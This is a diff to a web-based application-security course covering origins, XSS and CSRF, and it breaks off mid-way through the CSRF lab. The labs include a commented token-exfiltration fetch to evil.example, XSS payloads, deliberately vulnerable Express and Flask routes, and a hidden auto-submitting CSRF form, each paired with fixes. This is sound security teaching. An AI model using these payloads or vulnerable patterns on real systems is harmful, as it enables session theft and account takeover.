@@ -501,6 +501,15 @@ button { background: none; border: 0; cursor: pointer; font: inherit; color: inh
     --l1: #34d399;
     --l2: #22d3ee;
     --l3: #c084fc;
+    --l4: #f472b6;
+    --l5: #fbbf24;
+    --l6: #60a5fa;
+    --l7: #a3e635;
+    --l8: #fb923c;
+    --l9: #2dd4bf;
+    --l10: #e879f9;
+    --l11: #f87171;
+    --l12: #818cf8;
     --code-bg: #0d1321;
   }
   html, body { background: var(--bg); color: var(--text); font-family: 'Inter', ui-sans-serif, system-ui, -apple-system, sans-serif; }
@@ -663,8 +672,17 @@ const {
      and <details> reveals — everything the source content uses).
    - tracker[] drives the per-module checkboxes + the overall progress bar.
 
-   RESUME MARKER: migrated phases = Phase 0, Phase 1. Remaining = Phases 2-10
-   (+7.5) and the 4 capstones. Source of truth: full_stack_appsec_curriculum.md.
+   RESUME MARKER: migrated phases = Phase 0, Phase 1, Phase 2. Remaining = Phases
+   3-10 (+7.5) and the 4 capstones. Source of truth: full_stack_appsec_curriculum.md.
+   NOTE (session 2): App component was rewritten from the old Cyber Guardians
+   schema (levels/theory) to the new phases/phaseId/body schema — it previously
+   crashed on load (curriculum.levels undefined). All phase definitions (p0-p10,
+   p7_5) are already in curriculum.phases; only Phase 3+ MODULE objects remain.
+   Body template-literal escaping convention (match Phase 0-1 exactly): opening
+   delimiter is a BARE backtick; inline code and ``` fences use \\` (single
+   backslash + backtick); literal ${...} in code samples uses \\${ (single
+   backslash). Do NOT over-escape (the session-2 first pass used \\\\` and had to
+   be repaired). Validate with node --check after each phase.
    ========================================================================= */
 
 const curriculum = {
@@ -685,6 +703,76 @@ const curriculum = {
     tagline: "The protocols (HTTP/DNS/TLS) and tools security rides on",
     colorVar: "--l2",
     weeks: "2–3 weeks"
+  }, {
+    id: "p2",
+    name: "Phase 2 · Secure JavaScript & Browser Security",
+    short: "Phase 2 · Browser Security",
+    tagline: "The browser's security model: origins, XSS, CSRF, CORS",
+    colorVar: "--l3",
+    weeks: "3–4 weeks"
+  }, {
+    id: "p3",
+    name: "Phase 3 · Backend, API & Database Security",
+    short: "Phase 3 · Backend & API",
+    tagline: "Where trust is enforced: Express hardening, SQLi, APIs, uploads",
+    colorVar: "--l4",
+    weeks: "3–4 weeks"
+  }, {
+    id: "p4",
+    name: "Phase 4 · OWASP Top 10 & Web Exploitation Labs",
+    short: "Phase 4 · OWASP Labs",
+    tagline: "The Top 10 as a threat-modeling lens, plus hands-on labs",
+    colorVar: "--l5",
+    weeks: "2–3 weeks"
+  }, {
+    id: "p5",
+    name: "Phase 5 · Burp Suite, ZAP & Professional Testing",
+    short: "Phase 5 · Testing Workflow",
+    tagline: "The intercepting proxy and a repeatable assessment workflow",
+    colorVar: "--l6",
+    weeks: "2 weeks"
+  }, {
+    id: "p6",
+    name: "Phase 6 · Authentication, Authorization & Sessions",
+    short: "Phase 6 · Auth & Sessions",
+    tagline: "Password storage, sessions, JWTs, OAuth, authz, passkeys",
+    colorVar: "--l7",
+    weeks: "3–4 weeks"
+  }, {
+    id: "p7",
+    name: "Phase 7 · Secure SDLC, DevSecOps & Supply Chain",
+    short: "Phase 7 · Secure SDLC",
+    tagline: "Shift left: threat modeling, SAST/DAST, dependency security",
+    colorVar: "--l8",
+    weeks: "2 weeks"
+  }, {
+    id: "p7_5",
+    name: "Phase 7.5 · AI / LLM Application Security",
+    short: "Phase 7.5 · LLM Security",
+    tagline: "OWASP LLM Top 10, prompt injection, output handling",
+    colorVar: "--l9",
+    weeks: "1 week"
+  }, {
+    id: "p8",
+    name: "Phase 8 · Cloud, Deployment & Production Security",
+    short: "Phase 8 · Production",
+    tagline: "Secrets management, hardening, headers, cloud posture",
+    colorVar: "--l10",
+    weeks: "2 weeks"
+  }, {
+    id: "p9",
+    name: "Phase 9 · Logging, Monitoring & Incident Response",
+    short: "Phase 9 · Monitoring & IR",
+    tagline: "Security logging, detection, alerting, and IR playbooks",
+    colorVar: "--l11",
+    weeks: "1–2 weeks"
+  }, {
+    id: "p10",
+    name: "Phase 10 · Portfolio Capstones",
+    short: "Phase 10 · Capstones",
+    tagline: "Four portfolio projects that prove the work to employers",
+    colorVar: "--l12",
+    weeks: "Ongoing"
   }],
   modules: [
   // ============== PHASE 0 ==============
@@ -891,7 +979,7 @@ Create a file \`hello-web.html\`:
       document.getElementById("btn").addEventListener("click", () => {
         alert("The browser ran JavaScript");
       });
-    <\\/script>
+    <\/script>
   </body>
 </html>
 \`\`\`
@@ -1680,6 +1768,680 @@ npm audit fix --dry-run # shows what bumping would change WITHOUT applying it
 
 ➡️ **Next step:** You can read HTTP, reason about DNS/TLS, investigate from the CLI, and keep secrets out of Git. Now turn your frontend fluency into security intuition — starting with the browser's trust model. Continue to **Phase 2: Secure JavaScript and Browser Security**.`,
     tracker: ["git init'd cli-lab with .gitignore before first commit; confirmed .env not staged", "Ran gitleaks and saw it flag the hard-coded key inside tracked code", "Ran npm audit on an old lodash and read the CVE output", "Can explain why a committed secret must be rotated even after deletion", "Answered the knowledge check"]
+  },
+  // ============== PHASE 2 ==============
+  {
+    id: "m2-1",
+    phaseId: "p2",
+    num: "2.1",
+    title: "The Browser Trust Model",
+    objective: "Every browser-side attack and defense is defined relative to one concept: the origin. Same-origin policy, CORS, cookies, CSP are all answers to 'which code may read or send which data?' Get origins crisp and the rest is deduction.",
+    body: `> **Why this module is first in the phase.** Every browser-side attack and defense is defined relative to one concept: the **origin**. Same-origin policy, CORS, cookies, CSP — they are all answers to the question "which code is allowed to read or send which data?" If the origin model is fuzzy, the rest is memorization. If it's crisp, the rest is deduction.
+
+### 🎯 Concept: origins, the same-origin policy, and where state lives
+
+**An origin is the tuple (scheme, host, port).** \`https://app.example.com:443\` is an origin. Change *any* of the three — \`http://\` vs \`https://\`, \`app.\` vs \`api.\`, \`:443\` vs \`:8080\` — and it is a *different* origin. This triple is the atom of browser security; almost every rule is phrased as "same-origin" vs "cross-origin."
+
+**The Same-Origin Policy (SOP)** is the browser's foundational rule: **script running in one origin may not read data from a different origin.** Without it, any site you visited could silently read your open Gmail tab, your bank tab, everything. SOP is *why* the web is usable with multiple tabs from multiple companies open at once. Note the precise wording — SOP restricts *reading responses across origins*; it does **not** by itself stop your browser from *sending* a cross-origin request (that gap is exactly what CSRF exploits — Module 2.3).
+
+**CORS (Cross-Origin Resource Sharing)** is the *controlled exception* to SOP. Sometimes \`https://app.example.com\` legitimately needs to call \`https://api.example.com\`. CORS is a set of response headers by which the *server* says "I permit this specific other origin to read my responses." It loosens SOP deliberately — and misconfiguring it (Module 2.4) re-opens the hole SOP was closing.
+
+**Where the browser stores state — and the security trade-off of each:**
+- **Cookies** — small key/value pairs the server sets (\`Set-Cookie\`) and the browser **automatically attaches to every matching request**. Best for session identifiers *because* they can be made \`HttpOnly\` (invisible to JavaScript, so XSS can't read them — Module 6.2). The auto-send behavior is also the root of CSRF.
+- **localStorage** — string key/value store, persists across sessions, **fully readable by JavaScript**. Convenient, but anything here is stolen by a single XSS. **Do not store session tokens here** if you can use an \`HttpOnly\` cookie instead.
+- **sessionStorage** — like localStorage but cleared when the tab closes. Same JS-readable risk.
+- **IndexedDB** — a larger, structured client-side database. Also JS-accessible; same caution for secrets.
+- **Service workers** — scripts that sit between your page and the network, able to intercept and cache requests (offline support, push). Powerful, and a serious risk if an attacker can register a malicious one (e.g. via XSS): it can persist and intercept traffic. Restrict where they're served from and treat their registration as security-sensitive.
+
+**CSP (Content Security Policy)** is a response header (\`Content-Security-Policy\`) that tells the browser *which sources of script, style, image, etc. are allowed to load and run* on your page. Its headline power is **mitigating XSS**: a strict CSP can forbid inline scripts and only allow scripts from your own origin, so even if an attacker injects a \`<script>\` tag, the browser refuses to run it. CSP is **defense-in-depth**, not a primary fix — you still must stop the injection at the source (Module 2.2) — but a good CSP turns many XSS bugs from "account takeover" into "nothing happened."
+
+**The key storage rule, stated plainly:** *prefer secure, \`HttpOnly\`, \`SameSite\` cookies for session material in traditional web apps.* Reach for \`localStorage\` tokens only when you fully understand the XSS trade-off (an SPA calling a separate API is the common reason, and even then \`HttpOnly\` cookies are often viable). The reasoning, end to end: tokens in JS-readable storage are exfiltrated by any XSS; \`HttpOnly\` cookies are not — so the storage choice directly determines how bad an XSS bug becomes.
+
+**Dangerous DOM sinks — memorize this list.** A "sink" is a place where data you provide gets *interpreted as code or markup*. Writing attacker-controlled data into any of these can create XSS:
+- \`innerHTML\`, \`outerHTML\`, \`insertAdjacentHTML\` — parse the string as HTML (so \`<script>\`/\`<img onerror>\` execute).
+- \`document.write\` — writes HTML into the document during parsing.
+- \`eval\`, \`new Function\` — execute a string as JavaScript.
+- Unsafe template rendering / \`dangerouslySetInnerHTML\` (React) / \`v-html\` (Vue) — framework escape hatches that bypass the auto-escaping that normally protects you.
+
+### ⚔️ Hands-on: prove \`localStorage\` tokens are stealable and \`HttpOnly\` cookies are not
+
+> **Ethics & scope.** This runs against a tiny page *you* create and load locally, in *your own* browser. Reading your own \`localStorage\`/\`document.cookie\` in your own console changes nothing on any server. Never run exfiltration code against sites you don't own.
+
+Create \`storage-lab.html\`:
+
+\`\`\`html
+<!doctype html>
+<html><body>
+  <h1>Storage trust lab</h1>
+  <script>
+    // Simulate the WRONG choice: a session token in localStorage (JS-readable).
+    localStorage.setItem("token", "SESSION-TOKEN-PRETEND-SECRET");
+    // Simulate a non-HttpOnly cookie (also JS-readable):
+    document.cookie = "readable_session=abc123; SameSite=Lax";
+  <\/script>
+</body></html>
+\`\`\`
+
+Open it (\`open storage-lab.html\`), open DevTools → Console, and run the lines an XSS payload would run:
+
+\`\`\`javascript
+// What an injected script does to steal a JS-readable token:
+localStorage.getItem("token")     // -> "SESSION-TOKEN-PRETEND-SECRET"  (STOLEN)
+document.cookie                   // -> "readable_session=abc123"       (STOLEN)
+// The exfiltration an attacker appends (don't actually send anywhere real):
+// fetch("https://evil.example/c?t=" + localStorage.getItem("token"))
+\`\`\`
+
+**Expected observation:** both the localStorage token and the non-\`HttpOnly\` cookie print right out — any injected script can read and exfiltrate them. Now contrast: a real \`HttpOnly\` session cookie (you'll see one set by a server in Module 6.2) returns *nothing* from \`document.cookie\`. **The lesson is concrete: storage choice decides whether an XSS bug is a token theft or a non-event.** This is the single most important reason session material belongs in \`HttpOnly\` cookies.
+
+### 🛡️ Defense: choose storage by its XSS blast radius, and layer CSP
+
+- **Put session identifiers in \`Secure\`, \`HttpOnly\`, \`SameSite\` cookies** so JavaScript (and thus XSS) cannot read them (full cookie treatment in Module 6.2).
+- **Don't store secrets in localStorage/sessionStorage/IndexedDB** unless you've accepted the XSS exposure with eyes open and have strong XSS defenses.
+- **Deploy a strict CSP** as defense-in-depth: disallow inline scripts, allow scripts only from your origin (or nonce/hash-allow specific ones). It downgrades the impact of XSS you didn't catch.
+- **Treat service-worker registration as security-sensitive** — serve them only from trusted paths; an attacker who can register one can persist.
+- **Avoid the dangerous sinks** entirely where possible; when you must render rich HTML, sanitize (Module 2.2).
+
+**False-confidence traps:** "Tokens in localStorage are fine, we're careful about XSS" (one missed sink = full token theft; \`HttpOnly\` removes the whole class); "we have a CSP, so XSS can't hurt us" (CSP mitigates, doesn't prevent — misconfigured or \`unsafe-inline\` CSPs are common and bypassable; fix the injection too); "it's same-origin, so SOP protects it" (SOP doesn't stop same-origin XSS at all — the injected script *is* same-origin).
+
+### Knowledge check: The Browser Trust Model
+
+1. Define "origin" precisely and give an example of two URLs that are *cross*-origin despite sharing a domain.
+2. What exactly does the Same-Origin Policy restrict, and what does it *not* restrict (the gap CSRF uses)?
+3. Why are \`HttpOnly\` cookies safer than \`localStorage\` for session tokens?
+4. What role does CSP play against XSS, and why is it called defense-in-depth?
+5. List four dangerous DOM sinks and what they do.
+
+<details>
+<summary>Show answers</summary>
+
+1. An origin is the tuple **(scheme, host, port)** — e.g. \`https://app.example.com:443\`. \`https://app.example.com\` and \`https://api.example.com\` are cross-origin (different host), as are \`https://example.com\` and \`http://example.com\` (different scheme), or \`:443\` vs \`:8080\` (different port).
+2. SOP restricts **script in one origin from reading responses/data from a different origin**. It does **not** prevent the browser from *sending* a cross-origin request (with the user's cookies auto-attached) — that send-but-can't-read gap is what CSRF exploits.
+3. \`HttpOnly\` cookies are invisible to JavaScript (\`document.cookie\` can't read them), so an XSS payload cannot exfiltrate them. localStorage is fully JS-readable, so any XSS steals tokens stored there.
+4. CSP tells the browser which script sources may load/run; a strict policy blocks injected inline scripts even if injection succeeds — mitigating XSS impact. It's defense-in-depth because it doesn't stop the injection itself (and can be misconfigured/bypassed); you must still fix the root cause.
+5. Any four of: \`innerHTML\`/\`outerHTML\`/\`insertAdjacentHTML\` (parse string as HTML), \`document.write\` (write HTML during parse), \`eval\`/\`new Function\` (execute string as JS), framework escape hatches like \`dangerouslySetInnerHTML\`/\`v-html\` (bypass auto-escaping).
+</details>
+
+➡️ **Next step:** The most common way attacker text becomes attacker code in the browser is XSS. Let's go deep. Continue to **Module 2.2: XSS Deep Dive**.`,
+    tracker: ["Built storage-lab.html and read the localStorage token + non-HttpOnly cookie from the console", "Can define origin as (scheme, host, port) and give a cross-origin example", "Can state what SOP restricts and the send-but-can't-read gap CSRF uses", "Memorized the dangerous DOM sinks list", "Answered the knowledge check"]
+  }, {
+    id: "m2-2",
+    phaseId: "p2",
+    num: "2.2",
+    title: "XSS Deep Dive",
+    objective: "XSS is the most prevalent web vulnerability class. As a full-stack developer you both cause it (writing data into a page unsafely) and fix it (encoding output, choosing safe APIs). It is 'Console access' granted to an attacker in your users' browsers.",
+    body: `> **Why this matters.** Cross-Site Scripting is the most prevalent web vulnerability class, and as a full-stack developer you are the person who both causes it (by writing data into a page unsafely) and fixes it (by encoding output and choosing safe APIs). XSS means an attacker runs *their* JavaScript in *your users'* browsers, with all the power you demonstrated in the Console in Module 0.3 — read the DOM, steal JS-readable tokens, make requests as the user, deface the page, keylog. It is "Console access" granted to an attacker.
+
+### 🎯 Concept: how data becomes code, and the three types
+
+**The root cause, stated once:** XSS happens when **untrusted input is placed into a page in a context where the browser interprets it as code (or markup), instead of as inert text.** It is the browser-side twin of SQL injection (Module 0.5): the failure to keep *data* and *code* separate. The fix mirrors it too — keep them separate by *encoding output for its context*.
+
+**The three types, by where the injection lives:**
+
+- **Reflected XSS** — the malicious input is in the *request* and is immediately *reflected* back in the *response*. Example: a search page that puts \`?q=<script>...\` straight into the results HTML. The attacker must get the victim to click a crafted link. It's not stored anywhere; it "bounces."
+- **Stored (persistent) XSS** — the malicious input is *saved* on the server (a comment, profile name, review) and served to *every* viewer later. This is the most dangerous because it needs no per-victim lure — anyone who views the content is hit. (Juice Shop and DVWA both have stored-XSS challenges.)
+- **DOM-based XSS** — the injection never round-trips to the server; it happens entirely in the browser, when client-side JavaScript reads attacker-controlled input (e.g. \`location.hash\`, a query param) and writes it into a dangerous DOM sink (\`innerHTML\`). The server may be blameless; the bug is in the frontend JS.
+
+**Contexts — the reason "just escaping" isn't enough.** The *same* character is dangerous in some places and harmless in others, so encoding must match the **context** where data lands:
+- **HTML body context** — \`<div>HERE</div>\`. Dangerous chars: \`< > &\`. Encode to \`&lt; &gt; &amp;\`.
+- **HTML attribute context** — \`<input value="HERE">\`. Also quotes; an unencoded \`"\` breaks out of the attribute. Encode quotes; always quote attributes.
+- **JavaScript context** — \`<script>var x = "HERE";<\/script>\`. HTML-encoding is wrong here; you need JS-string escaping (and ideally never put untrusted data into a script at all).
+- **URL context** — \`<a href="HERE">\`. A \`javascript:\` URL executes; encode and validate the scheme (allow only \`http\`/\`https\`/\`mailto\`).
+- **CSS context** — inside \`<style>\`/\`style=\`. Has its own escaping and can leak data.
+
+The lesson: **encode output for the specific context it's rendered in.** A value that's safe in an HTML body can be an XSS in an attribute or a script. This is why "I escaped \`<\` and \`>\`" is not a blanket fix.
+
+**Output encoding vs. input sanitization — know the difference:**
+- **Output encoding** (the primary defense) transforms data *as it's written into a context* so it's rendered as inert text (\`<\` → \`&lt;\`). It's reliable because it's applied at the exact point of danger.
+- **Sanitization** (for when you must allow *some* HTML, like a rich-text comment) *removes* dangerous markup, keeping a safe subset, using a vetted library (DOMPurify). Never hand-roll a sanitizer — the bypass list is endless.
+- **Input validation** (reject obviously bad input early) is useful defense-in-depth but is *not* an XSS fix on its own, because the same input is safe or dangerous depending on output context.
+
+### ⚔️ Hands-on: build a reflected and a DOM XSS, then kill them
+
+> **Ethics & scope.** You'll build a deliberately vulnerable page/route *on your own machine* and exploit it in *your own* browser, plus optionally use OWASP Juice Shop / PortSwigger's *intentionally vulnerable* labs (which exist precisely for this). Never inject scripts into sites you don't own.
+
+**DOM XSS — entirely client-side.** Create \`dom-xss.html\`:
+
+\`\`\`html
+<!doctype html>
+<html><body>
+  <h1>Greeting</h1>
+  <div id="out"></div>
+  <script>
+    // ❌ VULNERABLE: reads attacker-controlled location.hash into innerHTML (a sink).
+    const name = decodeURIComponent(location.hash.slice(1));
+    document.getElementById("out").innerHTML = "Hello, " + name;
+  <\/script>
+</body></html>
+\`\`\`
+
+Open it with a payload in the hash:
+
+\`\`\`bash
+open "dom-xss.html#<img src=x onerror=alert('dom-xss')>"
+\`\`\`
+
+**Expected observation:** the \`alert\` fires. You put HTML in the URL fragment; the JS wrote it into \`innerHTML\`; the browser parsed it as markup and ran the \`onerror\`. No server was involved — pure DOM XSS. Now fix it by writing text, not HTML:
+
+\`\`\`javascript
+// ✅ FIX: textContent renders the string as inert text — never as markup.
+document.getElementById("out").textContent = "Hello, " + name;
+\`\`\`
+
+Reload with the same payload: the literal characters show, nothing executes.
+
+**Reflected XSS — server-side.** A tiny Express route that reflects a query param unsafely:
+
+\`\`\`js
+import express from "express";
+const app = express();
+// ❌ VULNERABLE: user input concatenated straight into the HTML response.
+app.get("/search", (req, res) => {
+  res.send(\`<h1>Results for \${req.query.q}</h1>\`);   // q is attacker-controlled
+});
+app.listen(3000, () => console.log("http://localhost:3000"));
+\`\`\`
+
+Trigger it:
+
+\`\`\`bash
+node app.js
+open "http://localhost:3000/search?q=<script>alert('reflected')<\/script>"
+\`\`\`
+
+The script runs. **Fix:** encode for the HTML context (use a templating engine that auto-escapes, or encode explicitly):
+
+\`\`\`js
+function htmlEscape(s){return String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}
+app.get("/search", (req, res) => {
+  res.send(\`<h1>Results for \${htmlEscape(req.query.q)}</h1>\`);  // ✅ inert text
+});
+\`\`\`
+
+**Lab platforms for depth:** PortSwigger Web Security Academy XSS labs (free, structured, every context) and OWASP Juice Shop's XSS challenges (\`docker run --rm -d -p 3000:3000 bkimminich/juice-shop\` — native ARM64) give you reflected, stored, and DOM variants to practice against, all *built to be hacked*.
+
+### 🛡️ Defense: encode for context, let frameworks help, sanitize rich HTML, layer CSP
+
+- **Encode output for its exact context** — HTML body, attribute, JS, URL, CSS each need the right encoding. This is the primary, reliable defense.
+- **Let your framework escape by default.** React, Vue, Angular, and modern template engines auto-escape interpolated values. **Do not reach for the escape hatches** (\`dangerouslySetInnerHTML\`, \`v-html\`, \`innerHTML\`) unless you've sanitized the content.
+- **Prefer safe DOM APIs:** \`textContent\`/\`innerText\` over \`innerHTML\`; \`setAttribute\` over building attribute strings; never \`eval\`/\`new Function\` on input.
+- **Sanitize rich HTML with a vetted library (DOMPurify)** when users legitimately submit formatting; never write your own sanitizer.
+- **Validate the URL scheme** before putting user input in \`href\`/\`src\` (allow only \`http\`/\`https\`/\`mailto\`); block \`javascript:\`.
+- **Add a strict CSP** (Module 2.1) so injected scripts are refused even if one slips through — defense-in-depth.
+
+**False-confidence traps:** "I escaped \`<\` and \`>\`, so I'm safe" (wrong if the data lands in an attribute, a \`javascript:\` URL, or a script context — encode for the *context*); "input validation blocks XSS" (the same input is safe/dangerous by output context; validation is secondary); "React is immune to XSS" (until someone uses \`dangerouslySetInnerHTML\` or builds a \`javascript:\` href — the escape hatches are the bugs); "CSP has it covered" (misconfigured or \`unsafe-inline\` CSPs are common; mitigation isn't prevention).
+
+### 💻 The same reflected XSS and fix in Python (Flask + Jinja2)
+
+The reflected-XSS bug is the server writing user input into the HTML response without context-appropriate encoding — and in Python the trap and the fix both center on **Jinja2 autoescaping**. Here is the same vulnerable \`/search\` route in Flask. The DOM-XSS portion above is pure browser JavaScript with no server involved, so it has no Python counterpart — but the reflected case is squarely a backend concern.
+
+\`\`\`python
+# ❌ VULNERABLE: building the HTML string by hand bypasses Jinja2 entirely.
+from flask import Flask, request
+app = Flask(__name__)
+
+@app.get("/search")
+def search():
+    q = request.args.get("q", "")
+    # f-string concatenation into HTML — the browser parses q as markup.
+    return f"<h1>Results for {q}</h1>"
+
+app.run(port=3000)
+\`\`\`
+
+\`\`\`bash
+python3 -m venv .venv && source .venv/bin/activate && pip install flask
+python3 app.py
+open "http://localhost:3000/search?q=<script>alert('reflected')<\/script>"
+\`\`\`
+
+The script runs — same bug as Express. Note the root cause: hand-building HTML with an f-string is the XSS twin of the SQL f-string footgun from Module 0.5 (data merged into code). **Fix: render through a template so Jinja2 auto-escapes the value for the HTML context.**
+
+\`\`\`python
+from flask import render_template_string
+# ✅ FIX: Jinja2 autoescaping is ON by default for .html templates and
+# render_template[_string]. It encodes < > & " ' for the HTML context automatically.
+@app.get("/search")
+def search():
+    q = request.args.get("q", "")
+    # {{ q }} is auto-escaped -> &lt;script&gt; renders as inert text.
+    return render_template_string("<h1>Results for {{ q }}</h1>", q=q)
+\`\`\`
+
+Two Python-specific pitfalls worth memorizing:
+
+\`\`\`python
+from markupsafe import escape, Markup
+# If you genuinely must build a fragment outside a template, escape explicitly —
+# this is the Python equivalent of Express's htmlEscape():
+return f"<h1>Results for {escape(q)}</h1>"      # ✅ escape() encodes for HTML context
+
+# ❌ NEVER wrap untrusted input in Markup(...) or use |safe in a template —
+# both tell Jinja2 "this is already safe, don't escape it" and re-open the XSS:
+Markup(f"<h1>{q}</h1>")                          # ❌ marks attacker input as trusted
+# {{ q|safe }}  <-- the |safe filter is Jinja2's dangerouslySetInnerHTML
+\`\`\`
+
+For rich-text that must allow *some* HTML (a comment with bold/links), sanitize with a vetted library rather than escaping — in Python that's **\`nh3\`** (Rust-backed, the modern choice) or \`bleach\` (now maintenance-mode): \`import nh3; safe_html = nh3.clean(user_html)\`. Never hand-roll a sanitizer in any language.
+
+> **Why this matters in both languages.** React/Vue auto-escape by default and Jinja2 auto-escapes by default — and in *both* the bugs cluster around the escape hatches (\`dangerouslySetInnerHTML\` / \`v-html\` / \`Markup\` / \`|safe\`). The discipline is identical: render through the template, encode for the context, and reach for a sanitizer only when you deliberately allow HTML.
+
+### Knowledge check: XSS Deep Dive
+
+1. State the root cause of XSS in one sentence, and name the database-layer bug it mirrors.
+2. Distinguish reflected, stored, and DOM-based XSS by *where the malicious input lives*.
+3. Why is "I HTML-escaped the value" not always sufficient? Give a context where it fails.
+4. What's the difference between output encoding and sanitization, and when do you need the latter?
+5. In the DOM-XSS lab, which one-word API change fixed the bug, and why?
+
+<details>
+<summary>Show answers</summary>
+
+1. XSS happens when untrusted input is placed into a page in a context where the browser interprets it as code/markup rather than inert text. It mirrors **SQL injection** (failure to separate data from code).
+2. Reflected: input is in the request and immediately echoed in the response (needs a crafted link). Stored: input is saved on the server and served to every later viewer. DOM-based: the injection happens entirely client-side when JS reads attacker input and writes it to a dangerous sink — the server may never see it.
+3. Because encoding must match the *output context*. HTML-escaping doesn't help inside a \`javascript:\` URL, a JS string, or sometimes an unquoted attribute. Example: \`<a href="USERINPUT">\` with \`javascript:alert(1)\` — HTML-escaping \`<>&\` doesn't stop the \`javascript:\` scheme from executing.
+4. Output encoding transforms data into inert text for a context (the default, reliable defense). Sanitization removes dangerous markup while keeping a safe subset and is needed only when you must *allow some HTML* (rich text) — use a vetted library like DOMPurify, never hand-rolled.
+5. Changing \`innerHTML\` to \`textContent\`. \`innerHTML\` parses the string as HTML (so the \`onerror\` runs); \`textContent\` inserts it as literal text that is never interpreted as markup.
+</details>
+
+➡️ **Next step:** XSS abuses code running in your origin. The next attack abuses the browser *sending your cookies* to your origin on a request the user never intended. Continue to **Module 2.3: CSRF and Browser-Automatic Credentials**.`,
+    tracker: ["Built dom-xss.html, fired the payload, then fixed it with textContent", "Built the reflected-XSS Express route and fixed it with context encoding", "Read the Flask + Jinja2 dual-language version (autoescaping, |safe trap)", "Can distinguish reflected vs stored vs DOM XSS by where the input lives", "Can explain why encoding must match the output context", "Answered the knowledge check"]
+  }, {
+    id: "m2-3",
+    phaseId: "p2",
+    num: "2.3",
+    title: "CSRF and Browser-Automatic Credentials",
+    objective: "CSRF exists because cookies are convenient: the browser auto-attaches your session cookie to every request to your site, even ones triggered by a malicious site. As a full-stack dev who builds forms and cookie sessions, this is your bug to prevent.",
+    body: `> **Why this matters.** CSRF is the attack that exists *because cookies are convenient.* The browser auto-attaches your session cookie to every request to your site — even requests triggered by a *different, malicious* site. So a page on \`evil.com\` can make the victim's browser fire an authenticated state-changing request to \`yourbank.com\`, and the bank sees a perfectly valid, cookie-authenticated request. As a full-stack developer who builds forms and cookie-based sessions, this is squarely your bug to prevent — and the defenses are cheap once you understand the mechanism.
+
+### 🎯 Concept: the gap SOP leaves open, and how the attack works
+
+Recall from Module 2.1: the Same-Origin Policy stops cross-origin script from *reading* responses, but it does **not** stop the browser from *sending* cross-origin requests — and crucially, **cookies are attached automatically based on the destination, regardless of which site initiated the request.** That's the entire vulnerability.
+
+**The attack, step by step:**
+1. The victim is logged into \`yourapp.com\` — their browser holds a valid session cookie.
+2. The victim visits \`evil.com\` (a forum post, a malicious ad, a phishing email link).
+3. \`evil.com\` contains a hidden form (or image, or \`fetch\`) targeting a *state-changing* endpoint on \`yourapp.com\` — say \`POST /account/email\` to change the victim's email to the attacker's.
+4. The browser sends that request to \`yourapp.com\` and — because the destination is \`yourapp.com\` — **automatically attaches the victim's session cookie.**
+5. \`yourapp.com\` sees a valid, authenticated request and changes the email. The attacker can now do a password reset to that email and take over the account.
+
+The victim did nothing but visit a page. They never saw a form. **The server can't tell the difference from a legitimate request, because the cookie is genuinely the victim's** — which is why the defense must prove the request *came from your own site*, not just that it carries a valid cookie.
+
+**Why cookies are auto-sent (and the consequence):** cookies were designed to make sessions seamless — you don't want to re-attach your identity on every request manually. The browser handles it. That convenience is the curse: it attaches identity to requests the user didn't intend.
+
+**The defenses, each tied to "prove same-site origin":**
+
+- **\`SameSite\` cookie attribute** — the modern first line. It controls whether the cookie is attached on *cross-site* requests:
+  - \`SameSite=Strict\` — never sent cross-site. Strongest, but breaks "click a link in an email and arrive logged in."
+  - \`SameSite=Lax\` (today's browser default) — sent on top-level *navigations* (clicking a link) but **not** on cross-site \`POST\`s, \`fetch\`, or iframe loads. This kills classic form-POST CSRF while keeping normal link-following working. For most apps, \`Lax\` is the sane default.
+  - \`SameSite=None\` — sent on all cross-site requests; **requires \`Secure\`**. Only for genuinely cross-site needs (embedded widgets, some SSO) — and then you *must* add CSRF tokens.
+- **CSRF tokens (synchronizer token pattern)** — the server embeds a random, per-session (or per-request) token in its own forms/pages; legitimate requests echo it back (in a hidden field or header); the server rejects requests without the matching token. \`evil.com\` *can't read* the token (SOP stops it reading your page), so it can't forge a valid request. This is the classic, robust defense and the one to use when \`SameSite\` alone isn't enough.
+- **Origin / Referer validation** — for state-changing requests, check the \`Origin\` (or \`Referer\`) header matches your site. Browsers set these and a cross-site request reveals the foreign origin. Useful as a defense-in-depth check.
+
+**"But my API is JSON — aren't I immune?"** A dangerous myth. A JSON API is *less* exposed to the simplest form-based CSRF (HTML forms can't send \`application/json\` cross-site without a CORS preflight), but it is **not magically immune**: misconfigured CORS (Module 2.4), endpoints that accept form-encoding too, or \`GET\`-based state changes can all reopen it. Don't rely on "it's JSON"; use \`SameSite\` + tokens for state-changing endpoints.
+
+### ⚔️ Hands-on: CSRF a local route, then defend it
+
+> **Ethics & scope.** Both the "victim" app and the "attacker" page run on *your own machine*. You're attacking your own server with your own browser to feel the mechanism. Never craft CSRF pages targeting sites you don't own.
+
+**Victim app** — \`csrf-victim.js\` (a route that changes email, protected only by a session cookie):
+
+\`\`\`js
+import express from "express";
+import cookieParser from "cookie-parser";
+const app = express();
+app.use(cookieParser());
+app.use(express.urlencoded({ extended: false }));   // accepts HTML form posts
+
+// Pretend the user logged in earlier and got this session cookie:
+app.get("/login", (req, res) => {
+  res.cookie("session", "valid-session-for-victim", { httpOnly: true }); // note: no SameSite yet
+  res.send("logged in");
+});
+
+let email = "victim@example.com";
+// ❌ VULNERABLE: trusts the cookie, but does NOT prove the request came from our site.
+app.post("/account/email", (req, res) => {
+  if (req.cookies.session !== "valid-session-for-victim") return res.status(401).send("no");
+  email = req.body.email;
+  res.send("email changed to " + email);
+});
+app.get("/account", (req, res) => res.send("current email: " + email));
+app.listen(3000, () => console.log("victim on http://localhost:3000"));
+\`\`\`
+
+**Attacker page** — \`attacker.html\`, served from a *different* origin (use a second port):
+
+\`\`\`html
+<!doctype html>
+<html><body>
+  <h1>Cute Cats</h1>
+  <!-- Hidden auto-submitting form targeting the victim app. The victim only
+       sees "Cute Cats"; their browser fires the POST with their session cookie. -->
+  <form id="f" action="http://localhost:3000/account/email" method="POST">
+    <input type="hidden" name="email" value="attacker@evil.example">
+  </form>
+  <script>document.getElementById("f").submit();<\/script>
+</body></html>
+\`\`\`
+
+Run the attack:
+
+\`\`\`bash
+node csrf-victim.js                         # victim on :3000
+open "http://localhost:3000/login"          # become the logged-in victim (sets cookie)
+# serve the attacker page on a DIFFERENT origin (port 8000) and open it:
+( cd "\$(dirname attacker.html)"; python3 -m http.server 8000 >/dev/null 2>&1 & )
+open "http://localhost:8000/attacker.html"  # the malicious page auto-submits
